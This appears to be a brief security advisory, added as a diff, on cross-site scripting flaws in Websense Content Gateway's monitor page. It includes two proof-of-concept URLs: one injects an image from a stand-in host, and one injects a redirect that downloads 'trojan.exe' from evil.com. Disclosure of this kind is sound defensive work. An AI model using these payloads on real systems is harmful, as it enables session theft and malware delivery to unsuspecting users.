@@ -1,0 +1,8 @@
+source: http://www.securityfocus.com/bid/55194/info
+
+Websense Content Gateway is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks. 
+
+https://www.example.com:8081/monitor/m_overview.ink?mode=0&menu=</script><img%20src%3Dhttp%3A%2f%2fwww.evilanother.com%2fimages%2fcross_site.jpg>
+https://www.example.com:8081/monitor/m_overview.ink?mode=0&menu=</script><meta%20http-equiv%3D%22refresh%22%20content%3D%220%3BURL%3Dhttps%3A%2f%2fwww.evil.com%2ftrojan.exe%22>
